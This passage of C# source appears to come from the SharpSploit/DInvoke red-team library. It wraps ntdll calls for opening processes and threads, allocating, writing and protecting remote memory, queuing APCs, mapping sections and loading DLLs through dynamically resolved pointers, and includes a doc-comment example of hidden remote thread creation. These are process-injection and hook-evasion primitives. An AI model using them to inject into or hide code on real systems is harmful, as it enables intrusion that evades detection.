                    Data.Native.NTSTATUS retValue = (Data.Native.NTSTATUS)Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtMapViewOfSection", typeof(DELEGATES.NtMapViewOfSection), ref funcargs);
                    if (retValue != Data.Native.NTSTATUS.Success && retValue != Data.Native.NTSTATUS.ImageNotAtBase)
                    {
                        throw new InvalidOperationException("Unable to map view of section, " + retValue);
                    }

                    // Update the modified variables.
                    BaseAddress = (IntPtr)funcargs[2];
                    ViewSize = (ulong)funcargs[6];

                    return retValue;
                }

                public static void RtlInitUnicodeString(ref Data.Native.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString)
                {
                    // Craft an array for the arguments
                    object[] funcargs =
                    {
                DestinationString, SourceString
            };

                    Generic.DynamicAPIInvoke(@"ntdll.dll", @"RtlInitUnicodeString", typeof(DELEGATES.RtlInitUnicodeString), ref funcargs);

                    // Update the modified variables
                    DestinationString = (Data.Native.UNICODE_STRING)funcargs[0];
                }

                public static Data.Native.NTSTATUS LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref Data.Native.UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle)
                {
                    // Craft an array for the arguments
                    object[] funcargs =
                    {
                PathToFile, dwFlags, ModuleFileName, ModuleHandle
            };

                    Data.Native.NTSTATUS retValue = (Data.Native.NTSTATUS)Generic.DynamicAPIInvoke(@"ntdll.dll", @"LdrLoadDll", typeof(DELEGATES.LdrLoadDll), ref funcargs);

                    // Update the modified variables
                    ModuleHandle = (IntPtr)funcargs[3];

                    return retValue;
                }

                public static void RtlZeroMemory(IntPtr Destination, int Length)
                {
                    // Craft an array for the arguments
                    object[] funcargs =
                    {
                Destination, Length
            };

                    Generic.DynamicAPIInvoke(@"ntdll.dll", @"RtlZeroMemory", typeof(DELEGATES.RtlZeroMemory), ref funcargs);
                }

                public static Data.Native.NTSTATUS NtQueryInformationProcess(IntPtr hProcess, Data.Native.PROCESSINFOCLASS processInfoClass, out IntPtr pProcInfo)
                {
                    int processInformationLength;
                    UInt32 RetLen = 0;

                    switch (processInfoClass)
                    {
                        case Data.Native.PROCESSINFOCLASS.ProcessWow64Information:
                            pProcInfo = Marshal.AllocHGlobal(IntPtr.Size);
                            RtlZeroMemory(pProcInfo, IntPtr.Size);
                            processInformationLength = IntPtr.Size;
                            break;
                        case Data.Native.PROCESSINFOCLASS.ProcessBasicInformation:
                            Data.Native.PROCESS_BASIC_INFORMATION PBI = new Data.Native.PROCESS_BASIC_INFORMATION();
                            pProcInfo = Marshal.AllocHGlobal(Marshal.SizeOf(PBI));
                            RtlZeroMemory(pProcInfo, Marshal.SizeOf(PBI));
                            Marshal.StructureToPtr(PBI, pProcInfo, true);
                            processInformationLength = Marshal.SizeOf(PBI);
                            break;
                        default:
                            throw new InvalidOperationException($"Invalid ProcessInfoClass: {processInfoClass}");
                    }

                    object[] funcargs =
                    {
                hProcess, processInfoClass, pProcInfo, processInformationLength, RetLen
            };

                    Data.Native.NTSTATUS retValue = (Data.Native.NTSTATUS)Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtQueryInformationProcess", typeof(DELEGATES.NtQueryInformationProcess), ref funcargs);
                    if (retValue != Data.Native.NTSTATUS.Success)
                    {
                        throw new UnauthorizedAccessException("Access is denied.");
                    }

                    // Update the modified variables
                    pProcInfo = (IntPtr)funcargs[2];

                    return retValue;
                }

                public static bool NtQueryInformationProcessWow64Information(IntPtr hProcess)
                {
                    Data.Native.NTSTATUS retValue = NtQueryInformationProcess(hProcess, Data.Native.PROCESSINFOCLASS.ProcessWow64Information, out IntPtr pProcInfo);
                    if (retValue != Data.Native.NTSTATUS.Success)
                    {
                        throw new UnauthorizedAccessException("Access is denied.");
                    }

                    if (Marshal.ReadIntPtr(pProcInfo) == IntPtr.Zero)
                    {
                        return false;
                    }
                    return true;
                }

                public static Data.Native.PROCESS_BASIC_INFORMATION NtQueryInformationProcessBasicInformation(IntPtr hProcess)
                {
                    Data.Native.NTSTATUS retValue = NtQueryInformationProcess(hProcess, Data.Native.PROCESSINFOCLASS.ProcessBasicInformation, out IntPtr pProcInfo);
                    if (retValue != Data.Native.NTSTATUS.Success)
                    {
                        throw new UnauthorizedAccessException("Access is denied.");
                    }

                    return (Data.Native.PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(pProcInfo, typeof(Data.Native.PROCESS_BASIC_INFORMATION));
                }

                public static IntPtr NtOpenProcess(UInt32 ProcessId, Data.Win32.Kernel32.ProcessAccessFlags DesiredAccess)
                {
                    // Create OBJECT_ATTRIBUTES & CLIENT_ID ref's
                    IntPtr ProcessHandle = IntPtr.Zero;
                    Data.Native.OBJECT_ATTRIBUTES oa = new Data.Native.OBJECT_ATTRIBUTES();
                    Data.Native.CLIENT_ID ci = new Data.Native.CLIENT_ID();
                    ci.UniqueProcess = (IntPtr)ProcessId;

                    // Craft an array for the arguments
                    object[] funcargs =
                    {
                ProcessHandle, DesiredAccess, oa, ci
            };

                    Data.Native.NTSTATUS retValue = (Data.Native.NTSTATUS)Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtOpenProcess", typeof(DELEGATES.NtOpenProcess), ref funcargs);
                    if (retValue != Data.Native.NTSTATUS.Success && retValue == Data.Native.NTSTATUS.InvalidCid)
                    {
                        throw new InvalidOperationException("An invalid client ID was specified.");
                    }
                    if (retValue != Data.Native.NTSTATUS.Success)
                    {
                        throw new UnauthorizedAccessException("Access is denied.");
                    }

                    // Update the modified variables
                    ProcessHandle = (IntPtr)funcargs[0];

                    return ProcessHandle;
                }

                public static void NtQueueApcThread(IntPtr ThreadHandle, IntPtr ApcRoutine, IntPtr ApcArgument1, IntPtr ApcArgument2, IntPtr ApcArgument3)
                {
                    // Craft an array for the arguments
                    object[] funcargs =
                    {
                ThreadHandle, ApcRoutine, ApcArgument1, ApcArgument2, ApcArgument3
            };

                    Data.Native.NTSTATUS retValue = (Data.Native.NTSTATUS)Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtQueueApcThread", typeof(DELEGATES.NtQueueApcThread), ref funcargs);
                    if (retValue != Data.Native.NTSTATUS.Success)
                    {
                        throw new InvalidOperationException("Unable to queue APC, " + retValue);
                    }
                }

                public static IntPtr NtOpenThread(int TID, Data.Win32.Kernel32.ThreadAccess DesiredAccess)
                {
                    // Create OBJECT_ATTRIBUTES & CLIENT_ID ref's
                    IntPtr ThreadHandle = IntPtr.Zero;
                    Data.Native.OBJECT_ATTRIBUTES oa = new Data.Native.OBJECT_ATTRIBUTES();
                    Data.Native.CLIENT_ID ci = new Data.Native.CLIENT_ID();
                    ci.UniqueThread = (IntPtr)TID;

                    // Craft an array for the arguments
                    object[] funcargs =
                    {
                ThreadHandle, DesiredAccess, oa, ci
            };

                    Data.Native.NTSTATUS retValue = (Data.Native.NTSTATUS)Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtOpenThread", typeof(DELEGATES.NtOpenProcess), ref funcargs);
                    if (retValue != Data.Native.NTSTATUS.Success && retValue == Data.Native.NTSTATUS.InvalidCid)
                    {
                        throw new InvalidOperationException("An invalid client ID was specified.");
                    }
                    if (retValue != Data.Native.NTSTATUS.Success)
                    {
                        throw new UnauthorizedAccessException("Access is denied.");
                    }

                    // Update the modified variables
                    ThreadHandle = (IntPtr)funcargs[0];

                    return ThreadHandle;
                }

                public static IntPtr NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect)
                {
                    // Craft an array for the arguments
                    object[] funcargs =
                    {
                ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect
            };

                    Data.Native.NTSTATUS retValue = (Data.Native.NTSTATUS)Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtAllocateVirtualMemory", typeof(DELEGATES.NtAllocateVirtualMemory), ref funcargs);
                    if (retValue == Data.Native.NTSTATUS.AccessDenied)
                    {
                        // STATUS_ACCESS_DENIED
                        throw new UnauthorizedAccessException("Access is denied.");
                    }
                    if (retValue == Data.Native.NTSTATUS.AlreadyCommitted)
                    {
                        // STATUS_ALREADY_COMMITTED
                        throw new InvalidOperationException("The specified address range is already committed.");
                    }
                    if (retValue == Data.Native.NTSTATUS.CommitmentLimit)
                    {
                        // STATUS_COMMITMENT_LIMIT
                        throw new InvalidOperationException("Your system is low on virtual memory.");
                    }
                    if (retValue == Data.Native.NTSTATUS.ConflictingAddresses)
                    {
                        // STATUS_CONFLICTING_ADDRESSES
                        throw new InvalidOperationException("The specified address range conflicts with the address space.");
                    }
                    if (retValue == Data.Native.NTSTATUS.InsufficientResources)
                    {
                        // STATUS_INSUFFICIENT_RESOURCES
                        throw new InvalidOperationException("Insufficient system resources exist to complete the API call.");
                    }
                    if (retValue == Data.Native.NTSTATUS.InvalidHandle)
                    {
                        // STATUS_INVALID_HANDLE
                        throw new InvalidOperationException("An invalid HANDLE was specified.");
                    }
                    if (retValue == Data.Native.NTSTATUS.InvalidPageProtection)
                    {
                        // STATUS_INVALID_PAGE_PROTECTION
                        throw new InvalidOperationException("The specified page protection was not valid.");
                    }
                    if (retValue == Data.Native.NTSTATUS.NoMemory)
                    {
                        // STATUS_NO_MEMORY
                        throw new InvalidOperationException("Not enough virtual memory or paging file quota is available to complete the specified operation.");
                    }
                    if (retValue == Data.Native.NTSTATUS.ObjectTypeMismatch)
                    {
                        // STATUS_OBJECT_TYPE_MISMATCH
                        throw new InvalidOperationException("There is a mismatch between the type of object that is required by the requested operation and the type of object that is specified in the request.");
                    }
                    if (retValue != Data.Native.NTSTATUS.Success)
                    {
                        // STATUS_PROCESS_IS_TERMINATING == 0xC000010A
                        throw new InvalidOperationException("An attempt was made to duplicate an object handle into or out of an exiting process.");
                    }

                    BaseAddress = (IntPtr)funcargs[1];
                    return BaseAddress;
                }

                public static void NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 FreeType)
                {
                    // Craft an array for the arguments
                    object[] funcargs =
                    {
                ProcessHandle, BaseAddress, RegionSize, FreeType
            };

                    Data.Native.NTSTATUS retValue = (Data.Native.NTSTATUS)Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtFreeVirtualMemory", typeof(DELEGATES.NtFreeVirtualMemory), ref funcargs);
                    if (retValue == Data.Native.NTSTATUS.AccessDenied)
                    {
                        // STATUS_ACCESS_DENIED
                        throw new UnauthorizedAccessException("Access is denied.");
                    }
                    if (retValue == Data.Native.NTSTATUS.InvalidHandle)
                    {
                        // STATUS_INVALID_HANDLE
                        throw new InvalidOperationException("An invalid HANDLE was specified.");
                    }
                    if (retValue != Data.Native.NTSTATUS.Success)
                    {
                        // STATUS_OBJECT_TYPE_MISMATCH == 0xC0000024
                        throw new InvalidOperationException("There is a mismatch between the type of object that is required by the requested operation and the type of object that is specified in the request.");
                    }
                }

                public static string GetFilenameFromMemoryPointer(IntPtr hProc, IntPtr pMem)
                {
                    // Alloc buffer for result struct
                    IntPtr pBase = IntPtr.Zero;
                    IntPtr RegionSize = (IntPtr)0x500;
                    IntPtr pAlloc = NtAllocateVirtualMemory(hProc, ref pBase, IntPtr.Zero, ref RegionSize, Data.Win32.Kernel32.MEM_COMMIT | Data.Win32.Kernel32.MEM_RESERVE, Data.Win32.WinNT.PAGE_READWRITE);

                    // Prepare NtQueryVirtualMemory parameters
                    Data.Native.MEMORYINFOCLASS memoryInfoClass = Data.Native.MEMORYINFOCLASS.MemorySectionName;
                    UInt32 MemoryInformationLength = 0x500;
                    UInt32 Retlen = 0;

                    // Craft an array for the arguments
                    object[] funcargs =
                    {
                hProc, pMem, memoryInfoClass, pAlloc, MemoryInformationLength, Retlen
            };

                    Data.Native.NTSTATUS retValue = (Data.Native.NTSTATUS)Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtQueryVirtualMemory", typeof(DELEGATES.NtQueryVirtualMemory), ref funcargs);

                    string FilePath = string.Empty;
                    if (retValue == Data.Native.NTSTATUS.Success)
                    {
                        Data.Native.UNICODE_STRING sn = (Data.Native.UNICODE_STRING)Marshal.PtrToStructure(pAlloc, typeof(Data.Native.UNICODE_STRING));
                        FilePath = Marshal.PtrToStringUni(sn.Buffer);
                    }

                    // Free allocation
                    NtFreeVirtualMemory(hProc, ref pAlloc, ref RegionSize, Data.Win32.Kernel32.MEM_RELEASE);
                    if (retValue == Data.Native.NTSTATUS.AccessDenied)
                    {
                        // STATUS_ACCESS_DENIED
                        throw new UnauthorizedAccessException("Access is denied.");
                    }
                    if (retValue == Data.Native.NTSTATUS.AccessViolation)
                    {
                        // STATUS_ACCESS_VIOLATION
                        throw new InvalidOperationException("The specified base address is an invalid virtual address.");
                    }
                    if (retValue == Data.Native.NTSTATUS.InfoLengthMismatch)
                    {
                        // STATUS_INFO_LENGTH_MISMATCH
                        throw new InvalidOperationException("The MemoryInformation buffer is larger than MemoryInformationLength.");
                    }
                    if (retValue == Data.Native.NTSTATUS.InvalidParameter)
                    {
                        // STATUS_INVALID_PARAMETER
                        throw new InvalidOperationException("The specified base address is outside the range of accessible addresses.");
                    }
                    return FilePath;
                }

                public static UInt32 NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewProtect)
                {
                    // Craft an array for the arguments
                    UInt32 OldProtect = 0;
                    object[] funcargs =
                    {
                ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect
            };

                    Data.Native.NTSTATUS retValue = (Data.Native.NTSTATUS)Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtProtectVirtualMemory", typeof(DELEGATES.NtProtectVirtualMemory), ref funcargs);
                    if (retValue != Data.Native.NTSTATUS.Success)
                    {
                        throw new InvalidOperationException("Failed to change memory protection, " + retValue);
                    }

                    OldProtect = (UInt32)funcargs[4];
                    return OldProtect;
                }

                public static UInt32 NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, UInt32 BufferLength)
                {
                    // Craft an array for the arguments
                    UInt32 BytesWritten = 0;
                    object[] funcargs =
                    {
                ProcessHandle, BaseAddress, Buffer, BufferLength, BytesWritten
            };

                    Data.Native.NTSTATUS retValue = (Data.Native.NTSTATUS)Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtWriteVirtualMemory", typeof(DELEGATES.NtWriteVirtualMemory), ref funcargs);
                    if (retValue != Data.Native.NTSTATUS.Success)
                    {
                        throw new InvalidOperationException("Failed to write memory, " + retValue);
                    }

                    BytesWritten = (UInt32)funcargs[4];
                    return BytesWritten;
                }

                public static IntPtr LdrGetProcedureAddress(IntPtr hModule, IntPtr FunctionName, IntPtr Ordinal, ref IntPtr FunctionAddress)
                {
                    // Craft an array for the arguments
                    object[] funcargs =
                    {
                hModule, FunctionName, Ordinal, FunctionAddress
            };

                    Data.Native.NTSTATUS retValue = (Data.Native.NTSTATUS)Generic.DynamicAPIInvoke(@"ntdll.dll", @"LdrGetProcedureAddress", typeof(DELEGATES.LdrGetProcedureAddress), ref funcargs);
                    if (retValue != Data.Native.NTSTATUS.Success)
                    {
                        throw new InvalidOperationException("Failed get procedure address, " + retValue);
                    }

                    FunctionAddress = (IntPtr)funcargs[3];
                    return FunctionAddress;
                }

                public static void RtlGetVersion(ref Data.Native.OSVERSIONINFOEX VersionInformation)
                {
                    // Craft an array for the arguments
                    object[] funcargs =
                    {
                VersionInformation
            };

                    Data.Native.NTSTATUS retValue = (Data.Native.NTSTATUS)Generic.DynamicAPIInvoke(@"ntdll.dll", @"RtlGetVersion", typeof(DELEGATES.RtlGetVersion), ref funcargs);
                    if (retValue != Data.Native.NTSTATUS.Success)
                    {
                        throw new InvalidOperationException("Failed get procedure address, " + retValue);
                    }

                    VersionInformation = (Data.Native.OSVERSIONINFOEX)funcargs[0];
                }

                public static UInt32 NtReadVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, ref UInt32 NumberOfBytesToRead)
                {
                    // Craft an array for the arguments
                    UInt32 NumberOfBytesRead = 0;
                    object[] funcargs =
                    {
                ProcessHandle, BaseAddress, Buffer, NumberOfBytesToRead, NumberOfBytesRead
            };

                    Data.Native.NTSTATUS retValue = (Data.Native.NTSTATUS)Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtReadVirtualMemory", typeof(DELEGATES.NtReadVirtualMemory), ref funcargs);
                    if (retValue != Data.Native.NTSTATUS.Success)
                    {
                        throw new InvalidOperationException("Failed to read memory, " + retValue);
                    }

                    NumberOfBytesRead = (UInt32)funcargs[4];
                    return NumberOfBytesRead;
                }

                public static IntPtr NtOpenFile(ref IntPtr FileHandle, Data.Win32.Kernel32.FileAccessFlags DesiredAccess, ref Data.Native.OBJECT_ATTRIBUTES ObjAttr, ref Data.Native.IO_STATUS_BLOCK IoStatusBlock, Data.Win32.Kernel32.FileShareFlags ShareAccess, Data.Win32.Kernel32.FileOpenFlags OpenOptions)
                {
                    // Craft an array for the arguments
                    object[] funcargs =
                    {
                FileHandle, DesiredAccess, ObjAttr, IoStatusBlock, ShareAccess, OpenOptions
            };

                    Data.Native.NTSTATUS retValue = (Data.Native.NTSTATUS)Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtOpenFile", typeof(DELEGATES.NtOpenFile), ref funcargs);
                    if (retValue != Data.Native.NTSTATUS.Success)
                    {
                        throw new InvalidOperationException("Failed to open file, " + retValue);
                    }


                    FileHandle = (IntPtr)funcargs[0];
                    return FileHandle;
                }

                /// <summary>
                /// Holds delegates for API calls in the NT Layer.
                /// Must be public so that they may be used with SharpSploit.Execution.DynamicInvoke.Generic.DynamicFunctionInvoke
                /// </summary>
                /// <example>
                /// 
                /// // These delegates may also be used directly.
                ///
                /// // Get a pointer to the NtCreateThreadEx function.
                /// IntPtr pFunction = Execution.DynamicInvoke.Generic.GetLibraryAddress(@"ntdll.dll", "NtCreateThreadEx");
                /// 
                /// //  Create an instance of a NtCreateThreadEx delegate from our function pointer.
                /// DELEGATES.NtCreateThreadEx createThread = (NATIVE_DELEGATES.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(
                ///    pFunction, typeof(NATIVE_DELEGATES.NtCreateThreadEx));
                ///
                /// //  Invoke NtCreateThreadEx using the delegate
                /// createThread(ref threadHandle, Data.Win32.WinNT.ACCESS_MASK.SPECIFIC_RIGHTS_ALL | Data.Win32.WinNT.ACCESS_MASK.STANDARD_RIGHTS_ALL, IntPtr.Zero,
                ///     procHandle, startAddress, IntPtr.Zero, Data.Native.NT_CREATION_FLAGS.HIDE_FROM_DEBUGGER, 0, 0, 0, IntPtr.Zero);
                /// 
                /// </example>
                public struct DELEGATES
                {
                    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                    public delegate Data.Native.NTSTATUS NtResumeThread(
                        IntPtr threadHandle,
                        uint suspendedCount
                        );
                    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                    public delegate Data.Native.NTSTATUS NtCreateThreadEx(
                        out IntPtr threadHandle,
                        uint desiredAccess,
                        IntPtr objectAttributes,
                        IntPtr processHandle,
                        IntPtr startAddress,
                        IntPtr parameter,
                        bool createSuspended,
                        int stackZeroBits,
                        int sizeOfStack,
                        int maximumStackSize,
                        IntPtr attributeList);

                    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                    public delegate Data.Native.NTSTATUS RtlCreateUserThread(
                        IntPtr Process,
                        IntPtr ThreadSecurityDescriptor,
                        bool CreateSuspended,
                        IntPtr ZeroBits,
                        IntPtr MaximumStackSize,
                        IntPtr CommittedStackSize,
                        IntPtr StartAddress,
                        IntPtr Parameter,
                        ref IntPtr Thread,
                        IntPtr ClientId);

                    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                    public delegate Data.Native.NTSTATUS NtCreateSection(
                        ref IntPtr SectionHandle,
                        uint DesiredAccess,
                        IntPtr ObjectAttributes,
                        ref ulong MaximumSize,
                        uint SectionPageProtection,
                        uint AllocationAttributes,
                        IntPtr FileHandle);

                    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                    public delegate Data.Native.NTSTATUS NtUnmapViewOfSection(
                        IntPtr hProc,
                        IntPtr baseAddr);

                    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                    public delegate Data.Native.NTSTATUS NtMapViewOfSection(
                        IntPtr SectionHandle,
                        IntPtr ProcessHandle,
                        out IntPtr BaseAddress,
                        IntPtr ZeroBits,
                        IntPtr CommitSize,
                        IntPtr SectionOffset,
                        out ulong ViewSize,
                        uint InheritDisposition,
                        uint AllocationType,
                        uint Win32Protect);

                    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                    public delegate UInt32 LdrLoadDll(
                        IntPtr PathToFile,
                        UInt32 dwFlags,
                        ref Data.Native.UNICODE_STRING ModuleFileName,
                        ref IntPtr ModuleHandle);

                    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                    public delegate void RtlInitUnicodeString(
                        ref Data.Native.UNICODE_STRING DestinationString,
                        [MarshalAs(UnmanagedType.LPWStr)]
                string SourceString);

                    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                    public delegate void RtlZeroMemory(
                        IntPtr Destination,
                        int length);

                    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                    public delegate UInt32 NtQueryInformationProcess(
                        IntPtr processHandle,
                        Data.Native.PROCESSINFOCLASS processInformationClass,
                        IntPtr processInformation,
                        int processInformationLength,
                        ref UInt32 returnLength);

                    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                    public delegate UInt32 NtOpenProcess(
                        ref IntPtr ProcessHandle,
                        Data.Win32.Kernel32.ProcessAccessFlags DesiredAccess,
                        ref Data.Native.OBJECT_ATTRIBUTES ObjectAttributes,
                        ref Data.Native.CLIENT_ID ClientId);

                    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                    public delegate UInt32 NtQueueApcThread(
                        IntPtr ThreadHandle,
                        IntPtr ApcRoutine,
                        IntPtr ApcArgument1,
                        IntPtr ApcArgument2,
                        IntPtr ApcArgument3);

                    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                    public delegate UInt32 NtOpenThread(
                        ref IntPtr ThreadHandle,
                        Data.Win32.Kernel32.ThreadAccess DesiredAccess,
                        ref Data.Native.OBJECT_ATTRIBUTES ObjectAttributes,
                        ref Data.Native.CLIENT_ID ClientId);

                    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                    public delegate UInt32 NtAllocateVirtualMemory(
                        IntPtr ProcessHandle,
                        ref IntPtr BaseAddress,
                        IntPtr ZeroBits,
                        ref IntPtr RegionSize,
                        UInt32 AllocationType,
                        UInt32 Protect);

                    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                    public delegate UInt32 NtFreeVirtualMemory(
                        IntPtr ProcessHandle,
                        ref IntPtr BaseAddress,
                        ref IntPtr RegionSize,
                        UInt32 FreeType);

                    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                    public delegate UInt32 NtQueryVirtualMemory(
                        IntPtr ProcessHandle,
                        IntPtr BaseAddress,
                        Data.Native.MEMORYINFOCLASS MemoryInformationClass,
                        IntPtr MemoryInformation,
                        UInt32 MemoryInformationLength,
                        ref UInt32 ReturnLength);

                    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                    public delegate UInt32 NtProtectVirtualMemory(
                        IntPtr ProcessHandle,
                        ref IntPtr BaseAddress,
                        ref IntPtr RegionSize,
                        UInt32 NewProtect,
                        ref UInt32 OldProtect);

                    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                    public delegate UInt32 NtWriteVirtualMemory(
                        IntPtr ProcessHandle,
                        IntPtr BaseAddress,
                        IntPtr Buffer,
                        UInt32 BufferLength,
                        ref UInt32 BytesWritten);

                    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                    public delegate UInt32 RtlUnicodeStringToAnsiString(
                        ref Data.Native.ANSI_STRING DestinationString,
                        ref Data.Native.UNICODE_STRING SourceString,
                        bool AllocateDestinationString);

                    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                    public delegate UInt32 LdrGetProcedureAddress(
                        IntPtr hModule,
                        IntPtr FunctionName,
                        IntPtr Ordinal,
                        ref IntPtr FunctionAddress);

                    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                    public delegate UInt32 RtlGetVersion(
                        ref Data.Native.OSVERSIONINFOEX VersionInformation);

                    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                    public delegate UInt32 NtReadVirtualMemory(
                        IntPtr ProcessHandle,
                        IntPtr BaseAddress,
                        IntPtr Buffer,
                        UInt32 NumberOfBytesToRead,
                        ref UInt32 NumberOfBytesRead);

                    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                    public delegate UInt32 NtOpenFile(
                        ref IntPtr FileHandle,
                        Data.Win32.Kernel32.FileAccessFlags DesiredAccess,
                        ref Data.Native.OBJECT_ATTRIBUTES ObjAttr,
                        ref Data.Native.IO_STATUS_BLOCK IoStatusBlock,
                        Data.Win32.Kernel32.FileShareFlags ShareAccess,
                        Data.Win32.Kernel32.FileOpenFlags OpenOptions);
                }
            }
        
    public class Generic
        {
            /// <summary>
            /// Dynamically invoke an arbitrary function from a DLL, providing its name, function prototype, and arguments.
            /// </summary>
            /// <author>The Wover (@TheRealWover)</author>
            /// <param name="DLLName">Name of the DLL.</param>
            /// <param name="FunctionName">Name of the function.</param>
            /// <param name="FunctionDelegateType">Prototype for the function, represented as a Delegate object.</param>
            /// <param name="Parameters">Parameters to pass to the function. Can be modified if function uses call by reference.</param>
            /// <param name="CanLoadFromDisk">Whether the DLL may be loaded from disk if it is not already loaded. Default is false.</param>
            /// <param name="ResolveForwards">Whether or not to resolve export forwards. Default is true.</param>
            /// <returns>Object returned by the function. Must be unmarshalled by the caller.</returns>
            public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters, bool CanLoadFromDisk = false, bool ResolveForwards = true)
            {
                IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName, CanLoadFromDisk, ResolveForwards);
                return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
            }

            /// <summary>
            /// Dynamically invokes an arbitrary function from a pointer. Useful for manually mapped modules or loading/invoking unmanaged code from memory.
            /// </summary>
            /// <author>The Wover (@TheRealWover)</author>
            /// <param name="FunctionPointer">A pointer to the unmanaged function.</param>
            /// <param name="FunctionDelegateType">Prototype for the function, represented as a Delegate object.</param>
            /// <param name="Parameters">Arbitrary set of parameters to pass to the function. Can be modified if function uses call by reference.</param>
            /// <returns>Object returned by the function. Must be unmarshalled by the caller.</returns>
            public static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
            {
                Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
                return funcDelegate.DynamicInvoke(Parameters);
            }

            /// <summary>
            /// Resolves LdrLoadDll and uses that function to load a DLL from disk.
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec)</author>
            /// <param name="DLLPath">The path to the DLL on disk. Uses the LoadLibrary convention.</param>
            /// <returns>IntPtr base address of the loaded module or IntPtr.Zero if the module was not loaded successfully.</returns>
            public static IntPtr LoadModuleFromDisk(string DLLPath)
            {
                Data.Native.UNICODE_STRING uModuleName = new Data.Native.UNICODE_STRING();
                Native.RtlInitUnicodeString(ref uModuleName, DLLPath);

                IntPtr hModule = IntPtr.Zero;
                Data.Native.NTSTATUS CallResult = Native.LdrLoadDll(IntPtr.Zero, 0, ref uModuleName, ref hModule);
                if (CallResult != Data.Native.NTSTATUS.Success || hModule == IntPtr.Zero)
                {
                    return IntPtr.Zero;
                }

                return hModule;
            }

            /// <summary>
            /// Helper for getting the pointer to a function from a DLL loaded by the process.
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec)</author>
            /// <param name="DLLName">The name of the DLL (e.g. "ntdll.dll" or "C:\Windows\System32\ntdll.dll").</param>
            /// <param name="FunctionName">Name of the exported procedure.</param>
            /// <param name="CanLoadFromDisk">Optional, indicates if the function can try to load the DLL from disk if it is not found in the loaded module list.</param>
            /// <param name="ResolveForwards">Whether or not to resolve export forwards. Default is true.</param>
            /// <returns>IntPtr for the desired function.</returns>
            public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false, bool ResolveForwards = true)
            {
                IntPtr hModule = GetLoadedModuleAddress(DLLName);
                if (hModule == IntPtr.Zero && CanLoadFromDisk)
                {
                    hModule = LoadModuleFromDisk(DLLName);
                    if (hModule == IntPtr.Zero)
                    {
                        throw new FileNotFoundException(DLLName + ", unable to find the specified file.");
                    }
                }
                else if (hModule == IntPtr.Zero)
                {
                    throw new DllNotFoundException(DLLName + ", Dll was not found.");
                }

                return GetExportAddress(hModule, FunctionName, ResolveForwards);
            }

            /// <summary>
            /// Helper for getting the pointer to a function from a DLL loaded by the process.
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec)</author>
            /// <param name="DLLName">The name of the DLL (e.g. "ntdll.dll" or "C:\Windows\System32\ntdll.dll").</param>
            /// <param name="Ordinal">Ordinal of the exported procedure.</param>
            /// <param name="CanLoadFromDisk">Optional, indicates if the function can try to load the DLL from disk if it is not found in the loaded module list.</param>
            /// <param name="ResolveForwards">Whether or not to resolve export forwards. Default is true.</param>
            /// <returns>IntPtr for the desired function.</returns>
            public static IntPtr GetLibraryAddress(string DLLName, short Ordinal, bool CanLoadFromDisk = false, bool ResolveForwards = true)
            {
                IntPtr hModule = GetLoadedModuleAddress(DLLName);
                if (hModule == IntPtr.Zero && CanLoadFromDisk)
                {
                    hModule = LoadModuleFromDisk(DLLName);
                    if (hModule == IntPtr.Zero)
                    {
